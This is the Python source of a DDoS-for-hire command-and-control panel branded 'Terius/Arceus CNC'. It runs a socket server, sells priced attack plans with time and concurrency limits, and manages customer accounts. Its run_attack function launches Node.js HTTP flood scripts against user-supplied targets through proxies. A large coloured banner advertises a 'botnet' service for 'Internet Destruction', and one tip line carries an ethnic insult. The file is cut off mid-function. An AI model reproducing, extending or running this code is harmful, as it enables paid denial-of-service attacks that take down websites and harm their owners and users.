#Free Source CNC @tretraunetwork // @phuvanduc 
import socket
import threading
import os
import json
from datetime import datetime
import random
import time
from rich.console import Console
from rich.table import Table
import subprocess
bots = []
clear = "\033[2J\033[H"
lol = [
    "Join @tretrauchat To Chat With Everyone ",
    "Welcome To Terius CNC With New Power & New Theme",
    "Do You Know Human_PC Channel? Join It With Link: https://t.me/+6-p2IOJXTagzZTU1",
    "Have a nice day everyone :)",
    "@phuvanduc Dep Trai Vai Ca Lon:)"
    "Join My Telegram Channel To Get More Updates Of Arceus CNC : https://t.me/tretraunetwork",
    "Do You Know How To Use This Control Panel? Type 'help' To Learn More",
    "Vietnam is Number One, China is DauBuoi",
    "Let's Get Started With Internet Destruction With Arceus!!",
]
console = Console()
ongoing_file = "ongoing.json"
ongoing_txt_file = "ongoing.txt"
def load_config():
    default_config = {"server": {"host": "0.0.0.0", "port": 6667}}
    try:
        if os.path.exists('config.json'):
            with open('config.json', 'r') as f:
                return json.load(f)
        with open('config.json', 'w') as f:
            json.dump(default_config, f)
        return default_config
    except:
        return default_config
def load_database():
    default_db = {
        "plans": {
            "Basic": {
                "max_time": 300,
                "cooldown": 60,
                "max_conc": 1,
                "price": 10,
                "methods": ["https-spam", "https-destroy"]
            },
            "Premium": {
                "max_time": 600,
                "cooldown": 30,
                "max_conc": 2,
                "price": 20,
                "methods": ["https-spam", "https-destroy", "https-super", "https-bypass"]
            },
            "Plus": {
                "max_time": 900,
                "cooldown": 15,
                "max_conc": 3,
                "price": 30,
                "methods": ["https-spam", "https-destroy", "https-super", "https-bypass", "https-light", "https-star"]
            },
            "Admin": {
                "max_time": 1800,
                "cooldown": 0,
                "max_conc": 10,
                "price": 50,
                "methods": ["https-spam", "https-destroy", "https-super", "https-bypass", "https-light", "https-star", "https-killer"]
            }
        },
        "user_plan": []
    }
    
    try:
        if os.path.exists('database.json'):
            with open('database.json', 'r') as f:
                db = json.load(f)
                for plan in default_db["plans"]:
                    if plan in db["plans"] and "methods" not in db["plans"][plan]:
                        db["plans"][plan]["methods"] = default_db["plans"][plan]["methods"]
                return db
        with open('database.json', 'w') as f:
            json.dump(default_db, f, indent=4)
        return default_db
    
    except Exception: 
        return default_db

def save_config(db_data):
    with open('database.json', 'w') as f:
        json.dump(db_data, f, indent=4)

def send(client_socket, message, newline=True):
    if newline:
        message += "\n"
    client_socket.send(message.encode())

def is_valid_expiry_date(date_str):
    try:
        expiry_date = datetime.strptime(date_str, "%Y-%m-%d")
        return expiry_date > datetime.now()
    except ValueError:
        return False

def load_ongoing():
    try:
        with open(ongoing_file, "r") as file:
            return json.load(file)
    except:
        return {"tasks": []}

def save_ongoing(data):
    with open(ongoing_file, "w") as file:
        json.dump(data, file, indent=4)

def add_task(username, method, url, port, time_value, cooldown):
    data = load_ongoing()
    expire_time = time.time() + int(time_value)
    cooldown_time = time.time() + int(time_value) + int(cooldown)
    data["tasks"].append({
        "username": username,
        "method": method,
        "url": url,
        "port": port,
        "length": time_value,
        "time": expire_time,
        "cooldown_time": cooldown_time
    })
    save_ongoing(data)
    console.print(f"[green]Added task:[/] {username} - {url}:{port} ({time_value}s)")

def get_ongoing():
    data = load_ongoing()
    current_time = time.time()
    ongoing_tasks = []
    for task in data["tasks"]:
        remaining_time = task["time"] - current_time
        if remaining_time > 0:
            ongoing_tasks.append({
                "username": task["username"],
                "method": task["method"],
                "url": task["url"],
                "port": task["port"],
                "length": task["length"],
                "finish": f"{remaining_time:.2f} secs"
            })
    return ongoing_tasks

def is_user_on_cooldown(username):
    data = load_ongoing()
    current_time = time.time()
    for task in data["tasks"]:
        if task["username"] == username and task["cooldown_time"] > current_time:
            return True, task["cooldown_time"] - current_time
    return False, 0

def remove_expired_tasks():
    while True:
        data = load_ongoing()
        current_time = time.time()
        data["tasks"] = [task for task in data["tasks"] if task["time"] > current_time]
        save_ongoing(data)
        time.sleep(5)

def print_table_to_file():
    tasks = get_ongoing()
    table = Table(style="white", title_style="bold magenta")
    table.add_column("#", style="cyan", justify="center")
    table.add_column("Target", style="white", justify="left")
    table.add_column("Port", style="blue", justify="center")
    table.add_column("Length", style="red", justify="center")
    table.add_column("Finish", style="yellow", justify="right")
    for idx, task in enumerate(tasks[:10], 1):  # Giới hạn 10 tasks
        table.add_row(
            str(idx),
            task["url"],
            str(task["port"]),
            str(task["length"]),
            task["finish"]
        )

    if not tasks:
        with open(ongoing_txt_file, "w") as f:
            f.write("No Running Attacks")
        return

    with open(ongoing_txt_file, "w") as f:
        console.file = f
        console.print(table)
        console.file = None
    console.print(table)

def get_table_from_file():
    try:
        with open(ongoing_txt_file, "r") as f:
            return f.read()
    except FileNotFoundError:
        return "No Running Attacks\n"

import json

def display_accounts(usernamex):
    try:
        with open('database.json', 'r') as f:
            db_data = json.load(f)
    except FileNotFoundError:
        return "[\x1b[38;5;1m!\033[0m] Database file not found!\n"
    except json.JSONDecodeError:
        return "[\x1b[38;5;1m!\033[0m] Error reading database file!\n"
    user_plan = next((plan for plan in db_data["user_plan"] if plan["username"] == usernamex), None)
    if not user_plan:
        return "[\x1b[38;5;1m!\033[0m] Account Not Found\n"
    output = ""
    output += f"[\x1b[38;5;1m!\033[0m] Username: {user_plan['username']}\n"
    output += f"[\x1b[38;5;1m!\033[0m] Plan: {user_plan['plan']}\n"
    output += f"[\x1b[38;5;1m!\033[0m] Max Time: {user_plan.get('time', 'N/A')}\n"
    output += f"[\x1b[38;5;1m!\033[0m] Cooldown: {user_plan.get('cooldown', 'N/A')}\n"
    output += f"[\x1b[38;5;1m!\033[0m] Max Conc: {user_plan.get('conc', 'N/A')}\n"
    output += f"[\x1b[38;5;1m!\033[0m] Expiry: {user_plan.get('expiry', 'N/A')}\n"
    output += f"[\x1b[38;5;1m!\033[0m] Blacklist: {user_plan.get('blacklist', 'N/A')}"
    
    return output

def display_prices(db_data):
    plans = db_data["plans"]
    if not plans:
        return "[\x1b[38;5;1m!\033[0m] No Plans Found\n"
    output = ""
    for plan_name, plan_data in plans.items():
        output += f"[\x1b[38;5;1m!\033[0m] Plan: {plan_name}\n"
        output += f"[\x1b[38;5;1m!\033[0m] Max Time: {plan_data['max_time']}\n"
        output += f"[\x1b[38;5;1m!\033[0m] Cooldown: {plan_data['max_time']}\n"
        output += f"[\x1b[38;5;1m!\033[0m] Max Conc: {plan_data['max_conc']}\n"
        output += f"[\x1b[38;5;1m!\033[0m] Price: \x1b[38;5;1m!\033[0m{plan_data.get('price', 'N/A')}\n"
        output += "-" * 30 + "\n"
    return output
def display_accounts(usernamex=None):
    try:
        with open('database.json', 'r') as f:
            db_data = json.load(f)
    except FileNotFoundError:
        return "Database file not found."
    except json.JSONDecodeError:
        return "Database file is corrupted."

    accounts = db_data.get("user_plan", [])
    result = ""
    for user in accounts:
        if usernamex is None or user["username"] == usernamex:
            result += (
                f"[\x1b[38;5;1m!\033[0m] Username: {user['username']}\n"
                f"[\x1b[38;5;1m!\033[0m] Plan: {user['plan']}\n"
                f"[\x1b[38;5;1m!\033[0m] Expiry: {user['expiry']}\n"
                f"[\x1b[38;5;1m!\033[0m] Connections: {user['conc']}\n"
                f"[\x1b[38;5;1m!\033[0m] Cooldown: {user['cooldown']}\n"
                f"[\x1b[38;5;1m!\033[0m] Time: {user['time']}\n"
                f"[\x1b[38;5;1m!\033[0m] Blacklisted: {user['blacklist']}\n"
            )
    if not result:
        result = "No accounts found."
    return result
def run_attack(method, url, port, time_value):
    script_name = f"{method}.js"
    if not os.path.exists(script_name):
        return False
    if method == "https-spam":
        subprocess.Popen(["node", "https-spam.js", url, str(time_value), "5","5","proxy.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif method == "https-destroy":
        subprocess.Popen(["node", "https-destroy.js", url, str(time_value), "5","5","proxy.txt","--bypass true","--extra true"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif method == "https-super":
        subprocess.Popen(["node", "https-super.js", url, str(time_value),"5","5","proxy.txt","food"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif method == "https-bypass":
        subprocess.Popen(["node", "https-bypass.js", url, str(time_value),"5","5","proxy.txt","bypass"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif method == "https-light":
        subprocess.Popen(["node", "https-light.js", url, str(time_value),"5","5","proxy.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif method == "https-star":
        subprocess.Popen(["node", "https-star.js", url, str(time_value), "5","5","proxy.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif method == "https-killer":
        subprocess.Popen(["node", "https-killer.js", url, str(time_value), "5","5","proxy.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return True
def add_plan(client_socket, db_data):
    send(client_socket, "Username: ", False)
    username = client_socket.recv(1024).decode().strip()
    
    if any(plan["username"] == username for plan in db_data["user_plan"]):
        send(client_socket, "Error: Username already exists!")
        return

    send(client_socket, "Password: ", False)
    password = client_socket.recv(1024).decode().strip()
    
    send(client_socket, "Expiry (YYYY-MM-DD): ", False)
    expiry = client_socket.recv(1024).decode().strip()
    if not is_valid_expiry_date(expiry):
        send(client_socket, "Invalid expiry date! Please use YYYY-MM-DD format.")
        return

    send(client_socket, "Plan (Basic/Premium/Plus/Admin): ", False)
    plan = client_socket.recv(1024).decode().strip()
    if plan not in db_data["plans"]:
        send(client_socket, "Invalid plan type. Available plans: Basic, Premium, Plus, Admin")
        return

    new_user = {
        "username": username,
        "password": password,
        "conc": db_data["plans"][plan]["max_conc"],
        "cooldown": db_data["plans"][plan]["cooldown"],
        "time": db_data["plans"][plan]["max_time"],
        "plan": plan,
        "expiry": expiry,
        "blacklist": False
    }

    db_data["user_plan"].append(new_user)

    with open('database.json', 'w') as f:
        json.dump(db_data, f, indent=4)
    
    send(client_socket, "Plan added successfully.")
def gay(client_socket, usernamex):
    send(client_socket, f" \x1b[38;2;242;10;255m𝚃\x1b[38;2;218;32;255m𝚎\x1b[38;2;194;53;255m𝚛\x1b[38;2;170;75;255m𝚒\x1b[38;2;145;96;255m𝚞\x1b[38;2;121;117;255m𝚜\x1b[38;2;97;139;255m_\x1b[38;2;72;160;255m𝙲\x1b[38;2;48;182;255m𝙽\x1b[38;2;24;203;255m𝙲\x1b[38;2;0;224;255m\033[0m | 𝙼𝚊𝚒𝚗𝚝𝚎𝚗𝚊𝚗𝚌𝚎 𝙱𝚢 \033[4m\x1b[38;5;1m@𝚝𝚛𝚎𝚝𝚛𝚊𝚞𝚗𝚎𝚝𝚠𝚘𝚛𝚔\033[0m | 𝙾𝚔𝚊𝚢 𝙻𝚎𝚝'𝚜 𝙹𝚘𝚒𝚗 𝙲𝙽𝙲  ")

def ducc(client_socket, usernamex):
    gay(client_socket, usernamex)
    send(client_socket,f"""
                         \033[1;36m \x1b[38;2;7;19;255m╔\x1b[38;2;16;28;255m╦\x1b[38;2;25;36;255m╗\x1b[38;2;35;45;255m╔\x1b[38;2;44;54;255m═\x1b[38;2;53;63;255m╗\x1b[38;2;62;71;255m╦\x1b[38;2;71;80;255m═\x1b[38;2;80;89;255m╗\x1b[38;2;90;97;255m╦\x1b[38;2;99;106;255m╦\x1b[38;2;108;115;255m \x1b[38;2;117;124;255m╦\x1b[38;2;126;132;255m╔\x1b[38;2;135;141;255m═\x1b[38;2;145;150;255m╗\x1b[38;2;154;159;255m \x1b[38;2;163;167;255m \x1b[38;2;172;176;255m╔\x1b[38;2;181;185;255m═\x1b[38;2;190;193;255m╗\x1b[38;2;200;202;255m╔\x1b[38;2;209;211;255m╗\x1b[38;2;218;220;255m╔\x1b[38;2;227;228;255m╔\x1b[38;2;236;237;255m═\x1b[38;2;245;246;255m╗\x1b[38;2;255;254;255m
                           \x1b[38;2;7;19;255m║\x1b[38;2;17;28;255m \x1b[38;2;26;37;255m║\x1b[38;2;36;46;255m╣\x1b[38;2;45;55;255m \x1b[38;2;55;64;255m╠\x1b[38;2;64;73;255m╦\x1b[38;2;74;82;255m╝\x1b[38;2;83;91;255m║\x1b[38;2;93;101;255m║\x1b[38;2;102;110;255m \x1b[38;2;112;119;255m║\x1b[38;2;121;128;255m╚\x1b[38;2;131;137;255m═\x1b[38;2;140;146;255m╗\x1b[38;2;150;155;255m \x1b[38;2;159;164;255m \x1b[38;2;169;173;255m║\x1b[38;2;178;182;255m \x1b[38;2;188;191;255m \x1b[38;2;197;200;255m║\x1b[38;2;207;209;255m║\x1b[38;2;216;218;255m║\x1b[38;2;226;227;255m║\x1b[38;2;235;236;255m \x1b[38;2;245;245;255m \x1b[38;2;255;255;255m\033[0m
                           \033[1;36m\x1b[38;2;7;19;255m╩\x1b[38;2;17;28;255m \x1b[38;2;26;37;255m╚\x1b[38;2;36;46;255m═\x1b[38;2;45;55;255m╝\x1b[38;2;55;64;255m╩\x1b[38;2;64;73;255m╚\x1b[38;2;74;82;255m═\x1b[38;2;83;91;255m╩\x1b[38;2;93;101;255m╚\x1b[38;2;102;110;255m═\x1b[38;2;112;119;255m╝\x1b[38;2;121;128;255m╚\x1b[38;2;131;137;255m═\x1b[38;2;140;146;255m╝\x1b[38;2;150;155;255m \x1b[38;2;159;164;255m \x1b[38;2;169;173;255m╚\x1b[38;2;178;182;255m═\x1b[38;2;188;191;255m╝\x1b[38;2;197;200;255m╝\x1b[38;2;207;209;255m╚\x1b[38;2;216;218;255m╝\x1b[38;2;226;227;255m╚\x1b[38;2;235;236;255m═\x1b[38;2;245;245;255m╝\x1b[38;2;255;255;255m\033[0m
               𝚃𝚎𝚛𝚒𝚞𝚜 𝙲𝙽𝙲, 𝙱𝚎𝚜𝚝 𝚂𝚎𝚛𝚟𝚒𝚌𝚎 𝙱𝚘𝚝𝚗𝚎𝚝, 𝚂𝚝𝚛𝚘𝚗𝚐 & 𝙲𝚑𝚎𝚊𝚙
           \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;5;17;255m╚\x1b[38;2;9;21;255m═\x1b[38;2;14;25;255m╦\x1b[38;2;18;29;255m═\x1b[38;2;23;34;255m═\x1b[38;2;27;38;255m═\x1b[38;2;31;42;255m═\x1b[38;2;36;46;255m═\x1b[38;2;40;51;255m═\x1b[38;2;45;55;255m═\x1b[38;2;49;59;255m═\x1b[38;2;54;63;255m═\x1b[38;2;58;68;255m═\x1b[38;2;63;72;255m═\x1b[38;2;67;76;255m═\x1b[38;2;72;80;255m═\x1b[38;2;76;85;255m═\x1b[38;2;81;89;255m═\x1b[38;2;85;93;255m═\x1b[38;2;89;97;255m═\x1b[38;2;94;102;255m═\x1b[38;2;98;106;255m═\x1b[38;2;103;110;255m═\x1b[38;2;107;114;255m═\x1b[38;2;112;119;255m═\x1b[38;2;116;123;255m═\x1b[38;2;121;127;255m═\x1b[38;2;125;131;255m═\x1b[38;2;130;136;255m═\x1b[38;2;134;140;255m═\x1b[38;2;139;144;255m═\x1b[38;2;143;148;255m═\x1b[38;2;147;153;255m═\x1b[38;2;152;157;255m═\x1b[38;2;156;161;255m═\x1b[38;2;161;165;255m═\x1b[38;2;165;170;255m═\x1b[38;2;170;174;255m═\x1b[38;2;174;178;255m═\x1b[38;2;179;182;255m═\x1b[38;2;183;187;255m═\x1b[38;2;188;191;255m═\x1b[38;2;192;195;255m═\x1b[38;2;197;199;255m═\x1b[38;2;201;204;255m═\x1b[38;2;205;208;255m═\x1b[38;2;210;212;255m═\x1b[38;2;214;216;255m═\x1b[38;2;219;221;255m═\x1b[38;2;223;225;255m═\x1b[38;2;228;229;255m═\x1b[38;2;232;233;255m═\x1b[38;2;237;238;255m═\x1b[38;2;241;242;255m╦\x1b[38;2;246;246;255m═\x1b[38;2;250;250;255m╝\x1b[38;2;255;255;255m\033[0m
        \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;5;16;255m╚\x1b[38;2;9;20;255m╔\x1b[38;2;13;24;255m═\x1b[38;2;17;28;255m═\x1b[38;2;21;32;255m═\x1b[38;2;25;36;255m╩\x1b[38;2;29;39;255m═\x1b[38;2;33;43;255m═\x1b[38;2;37;47;255m═\x1b[38;2;41;51;255m═\x1b[38;2;45;55;255m═\x1b[38;2;49;59;255m═\x1b[38;2;53;63;255m═\x1b[38;2;57;66;255m═\x1b[38;2;61;70;255m═\x1b[38;2;65;74;255m═\x1b[38;2;69;78;255m═\x1b[38;2;73;82;255m═\x1b[38;2;77;86;255m═\x1b[38;2;81;89;255m═\x1b[38;2;85;93;255m═\x1b[38;2;89;97;255m═\x1b[38;2;93;101;255m═\x1b[38;2;97;105;255m═\x1b[38;2;101;109;255m═\x1b[38;2;105;112;255m═\x1b[38;2;109;116;255m═\x1b[38;2;113;120;255m═\x1b[38;2;117;124;255m═\x1b[38;2;121;128;255m═\x1b[38;2;125;132;255m═\x1b[38;2;130;135;255m═\x1b[38;2;134;139;255m═\x1b[38;2;138;143;255m═\x1b[38;2;142;147;255m═\x1b[38;2;146;151;255m═\x1b[38;2;150;155;255m═\x1b[38;2;154;159;255m═\x1b[38;2;158;162;255m═\x1b[38;2;162;166;255m═\x1b[38;2;166;170;255m═\x1b[38;2;170;174;255m═\x1b[38;2;174;178;255m═\x1b[38;2;178;182;255m═\x1b[38;2;182;185;255m═\x1b[38;2;186;189;255m═\x1b[38;2;190;193;255m═\x1b[38;2;194;197;255m═\x1b[38;2;198;201;255m═\x1b[38;2;202;205;255m═\x1b[38;2;206;208;255m═\x1b[38;2;210;212;255m═\x1b[38;2;214;216;255m═\x1b[38;2;218;220;255m═\x1b[38;2;222;224;255m═\x1b[38;2;226;228;255m═\x1b[38;2;230;231;255m╩\x1b[38;2;234;235;255m═\x1b[38;2;238;239;255m═\x1b[38;2;242;243;255m═\x1b[38;2;246;247;255m╗\x1b[38;2;250;251;255m╝\x1b[38;2;255;255;255m\033[0m
        \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;5;16;255m╚\x1b[38;2;9;20;255m║\033[0m  𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚃𝚎𝚛𝚒𝚞𝚜 𝙲𝙽𝙲, 𝚊 𝚛𝚎𝚙𝚞𝚝𝚊𝚋𝚕𝚎 𝚊𝚗𝚍 𝚚𝚞𝚊𝚕𝚒𝚝𝚢 𝚜𝚎𝚛𝚟𝚒𝚌𝚎  \033[1;36m\x1b[38;2;246;247;255m║\x1b[38;2;251;251;255m╝
        \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;5;16;255m╚\x1b[38;2;9;20;255m║\033[0m 𝚃𝚎𝚛𝚒𝚞𝚜 𝚂𝚎𝚛𝚟𝚒𝚌𝚎𝚜 𝙿𝚛𝚘𝚟𝚒𝚍𝚎 𝙵𝚞𝚕𝚕 𝙻𝚊𝚢𝚎𝚛 𝟺/𝟽 𝙿𝚘𝚠𝚎𝚛, 𝚂𝚝𝚛𝚘𝚗𝚐, .. \033[1;36m\x1b[38;2;246;247;255m║\x1b[38;2;251;251;255m╝
       \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;4;16;255m╔\x1b[38;2;8;20;255m╗\x1b[38;2;12;24;255m╚\x1b[38;2;16;28;255m═\x1b[38;2;20;31;255m═\x1b[38;2;24;35;255m═\x1b[38;2;28;39;255m═\x1b[38;2;32;42;255m═\x1b[38;2;36;46;255m═\x1b[38;2;40;50;255m═\x1b[38;2;44;54;255m═\x1b[38;2;47;57;255m═\x1b[38;2;51;61;255m═\x1b[38;2;55;65;255m═\x1b[38;2;59;68;255m═\x1b[38;2;63;72;255m═\x1b[38;2;67;76;255m═\x1b[38;2;71;80;255m═\x1b[38;2;75;83;255m═\x1b[38;2;79;87;255m═\x1b[38;2;83;91;255m═\x1b[38;2;87;95;255m═\x1b[38;2;90;98;255m═\x1b[38;2;94;102;255m═\x1b[38;2;98;106;255m═\x1b[38;2;102;109;255m═\x1b[38;2;106;113;255m═\x1b[38;2;110;117;255m═\x1b[38;2;114;121;255m═\x1b[38;2;118;124;255m═\x1b[38;2;122;128;255m═\x1b[38;2;126;132;255m═\x1b[38;2;129;135;255m═\x1b[38;2;133;139;255m═\x1b[38;2;137;143;255m═\x1b[38;2;141;147;255m═\x1b[38;2;145;150;255m═\x1b[38;2;149;154;255m═\x1b[38;2;153;158;255m═\x1b[38;2;157;161;255m═\x1b[38;2;161;165;255m═\x1b[38;2;165;169;255m═\x1b[38;2;169;173;255m═\x1b[38;2;172;176;255m═\x1b[38;2;176;180;255m═\x1b[38;2;180;184;255m═\x1b[38;2;184;188;255m═\x1b[38;2;188;191;255m═\x1b[38;2;192;195;255m═\x1b[38;2;196;199;255m═\x1b[38;2;200;202;255m═\x1b[38;2;204;206;255m═\x1b[38;2;208;210;255m═\x1b[38;2;212;214;255m═\x1b[38;2;215;217;255m═\x1b[38;2;219;221;255m═\x1b[38;2;223;225;255m═\x1b[38;2;227;228;255m═\x1b[38;2;231;232;255m═\x1b[38;2;235;236;255m═\x1b[38;2;239;240;255m═\x1b[38;2;243;243;255m╝\x1b[38;2;247;247;255m╔\x1b[38;2;251;251;255m╗\x1b[38;2;255;255;255m\033[0m
       \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;4;16;255m║\x1b[38;2;8;20;255m╚\x1b[38;2;12;24;255m═\x1b[38;2;16;28;255m═\x1b[38;2;20;31;255m═\x1b[38;2;24;35;255m═\x1b[38;2;28;39;255m═\x1b[38;2;32;42;255m═\x1b[38;2;36;46;255m═\x1b[38;2;40;50;255m═\x1b[38;2;44;54;255m═\x1b[38;2;47;57;255m═\x1b[38;2;51;61;255m═\x1b[38;2;55;65;255m═\x1b[38;2;59;68;255m═\x1b[38;2;63;72;255m═\x1b[38;2;67;76;255m═\x1b[38;2;71;80;255m═\x1b[38;2;75;83;255m═\x1b[38;2;79;87;255m═\x1b[38;2;83;91;255m═\x1b[38;2;87;95;255m═\x1b[38;2;90;98;255m═\x1b[38;2;94;102;255m═\x1b[38;2;98;106;255m═\x1b[38;2;102;109;255m═\x1b[38;2;106;113;255m═\x1b[38;2;110;117;255m═\x1b[38;2;114;121;255m═\x1b[38;2;118;124;255m═\x1b[38;2;122;128;255m═\x1b[38;2;126;132;255m═\x1b[38;2;129;135;255m═\x1b[38;2;133;139;255m═\x1b[38;2;137;143;255m═\x1b[38;2;141;147;255m═\x1b[38;2;145;150;255m═\x1b[38;2;149;154;255m═\x1b[38;2;153;158;255m═\x1b[38;2;157;161;255m═\x1b[38;2;161;165;255m═\x1b[38;2;165;169;255m═\x1b[38;2;169;173;255m═\x1b[38;2;172;176;255m═\x1b[38;2;176;180;255m═\x1b[38;2;180;184;255m═\x1b[38;2;184;188;255m═\x1b[38;2;188;191;255m═\x1b[38;2;192;195;255m═\x1b[38;2;196;199;255m═\x1b[38;2;200;202;255m═\x1b[38;2;204;206;255m═\x1b[38;2;208;210;255m═\x1b[38;2;212;214;255m═\x1b[38;2;215;217;255m═\x1b[38;2;219;221;255m═\x1b[38;2;223;225;255m═\x1b[38;2;227;228;255m═\x1b[38;2;231;232;255m═\x1b[38;2;235;236;255m═\x1b[38;2;239;240;255m═\x1b[38;2;243;243;255m═\x1b[38;2;247;247;255m╝\x1b[38;2;251;251;255m║\x1b[38;2;255;255;255m\033[0m
       \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;5;16;255m║\033[0m - - - - - - - - 𝚑𝚝𝚝𝚙𝚜://𝚝.𝚖𝚎/𝚝𝚛𝚎𝚝𝚛𝚊𝚞𝚗𝚎𝚝𝚠𝚘𝚛𝚔 - - - - - - - -  \033[1;36m\x1b[38;2;251;251;255m║
      \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;4;16;255m╔\x1b[38;2;8;20;255m╩\x1b[38;2;12;24;255m═\x1b[38;2;16;27;255m═\x1b[38;2;20;31;255m═\x1b[38;2;23;34;255m═\x1b[38;2;27;38;255m═\x1b[38;2;31;42;255m═\x1b[38;2;35;45;255m═\x1b[38;2;39;49;255m═\x1b[38;2;42;52;255m═\x1b[38;2;46;56;255m═\x1b[38;2;50;60;255m═\x1b[38;2;54;63;255m═\x1b[38;2;57;67;255m═\x1b[38;2;61;70;255m═\x1b[38;2;65;74;255m═\x1b[38;2;69;78;255m═\x1b[38;2;73;81;255m═\x1b[38;2;76;85;255m═\x1b[38;2;80;88;255m═\x1b[38;2;84;92;255m═\x1b[38;2;88;96;255m═\x1b[38;2;92;99;255m═\x1b[38;2;95;103;255m═\x1b[38;2;99;107;255m═\x1b[38;2;103;110;255m═\x1b[38;2;107;114;255m═\x1b[38;2;111;117;255m═\x1b[38;2;114;121;255m═\x1b[38;2;118;125;255m═\x1b[38;2;122;128;255m═\x1b[38;2;126;132;255m═\x1b[38;2;129;135;255m═\x1b[38;2;133;139;255m═\x1b[38;2;137;143;255m═\x1b[38;2;141;146;255m═\x1b[38;2;145;150;255m═\x1b[38;2;148;153;255m═\x1b[38;2;152;157;255m═\x1b[38;2;156;161;255m═\x1b[38;2;160;164;255m═\x1b[38;2;164;168;255m═\x1b[38;2;167;171;255m═\x1b[38;2;171;175;255m═\x1b[38;2;175;179;255m═\x1b[38;2;179;182;255m═\x1b[38;2;183;186;255m═\x1b[38;2;186;190;255m═\x1b[38;2;190;193;255m═\x1b[38;2;194;197;255m═\x1b[38;2;198;200;255m═\x1b[38;2;201;204;255m═\x1b[38;2;205;208;255m═\x1b[38;2;209;211;255m═\x1b[38;2;213;215;255m═\x1b[38;2;217;218;255m═\x1b[38;2;220;222;255m═\x1b[38;2;224;226;255m═\x1b[38;2;228;229;255m═\x1b[38;2;232;233;255m═\x1b[38;2;236;236;255m═\x1b[38;2;239;240;255m═\x1b[38;2;243;244;255m═\x1b[38;2;247;247;255m╩\x1b[38;2;251;251;255m╗\x1b[38;2;255;255;255m\033[0m
      \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;5;16;255m║\033[0m    𝚃𝚢𝚙𝚎 '𝚑𝚎𝚕𝚙' 𝙸𝚗 𝙿𝚛𝚘𝚖𝚙𝚝 𝚃𝚘 𝙻𝚎𝚊𝚛𝚗 𝙼𝚘𝚛𝚎 𝙰𝚋𝚘𝚞𝚝 𝙲𝙽𝙲 𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜      \033[1;36m\x1b[38;2;251;251;255m║
      \033[1;36m\x1b[38;2;4;16;255m\x1b[38;2;5;16;255m║\033[0m 𝙹𝚘𝚒𝚗 @𝚝𝚛𝚎𝚝𝚛𝚊𝚞𝚗𝚎𝚝𝚠𝚘𝚛𝚔 𝚃𝚘 𝙶𝚎𝚝 𝚃𝚑𝚎 𝙴𝚊𝚛𝚕𝚒𝚎𝚜𝚝 𝚄𝚙𝚍𝚊𝚝𝚎𝚜 𝙾𝚏 𝚃𝚎𝚛𝚒𝚞𝚜 𝙲𝙽𝙲 \033[1;36m\x1b[38;2;251;251;255m║
      \033[1;36m\x1b[38;2;4;16;255m╚\x1b[38;2;8;20;255m═\x1b[38;2;12;24;255m═\x1b[38;2;16;27;255m═\x1b[38;2;20;31;255m═\x1b[38;2;23;34;255m═\x1b[38;2;27;38;255m═\x1b[38;2;31;42;255m═\x1b[38;2;35;45;255m═\x1b[38;2;39;49;255m═\x1b[38;2;42;52;255m═\x1b[38;2;46;56;255m═\x1b[38;2;50;60;255m═\x1b[38;2;54;63;255m═\x1b[38;2;57;67;255m═\x1b[38;2;61;70;255m═\x1b[38;2;65;74;255m═\x1b[38;2;69;78;255m═\x1b[38;2;73;81;255m═\x1b[38;2;76;85;255m═\x1b[38;2;80;88;255m═\x1b[38;2;84;92;255m═\x1b[38;2;88;96;255m═\x1b[38;2;92;99;255m═\x1b[38;2;95;103;255m═\x1b[38;2;99;107;255m═\x1b[38;2;103;110;255m═\x1b[38;2;107;114;255m═\x1b[38;2;111;117;255m═\x1b[38;2;114;121;255m═\x1b[38;2;118;125;255m═\x1b[38;2;122;128;255m═\x1b[38;2;126;132;255m═\x1b[38;2;129;135;255m═\x1b[38;2;133;139;255m═\x1b[38;2;137;143;255m═\x1b[38;2;141;146;255m═\x1b[38;2;145;150;255m═\x1b[38;2;148;153;255m═\x1b[38;2;152;157;255m═\x1b[38;2;156;161;255m═\x1b[38;2;160;164;255m═\x1b[38;2;164;168;255m═\x1b[38;2;167;171;255m═\x1b[38;2;171;175;255m═\x1b[38;2;175;179;255m═\x1b[38;2;179;182;255m═\x1b[38;2;183;186;255m═\x1b[38;2;186;190;255m═\x1b[38;2;190;193;255m═\x1b[38;2;194;197;255m═\x1b[38;2;198;200;255m═\x1b[38;2;201;204;255m═\x1b[38;2;205;208;255m═\x1b[38;2;209;211;255m═\x1b[38;2;213;215;255m═\x1b[38;2;217;218;255m═\x1b[38;2;220;222;255m═\x1b[38;2;224;226;255m═\x1b[38;2;228;229;255m═\x1b[38;2;232;233;255m═\x1b[38;2;236;236;255m═\x1b[38;2;239;240;255m═\x1b[38;2;243;244;255m═\x1b[38;2;247;247;255m═\x1b[38;2;251;251;255m╝\x1b[38;2;255;255;255m\033[0m
 
 Tips : {random.choice(lol)}[0m\n""")
def help(client_socket,usernamex):
    gay(client_socket,usernamex)
    send(client_socket,f"""
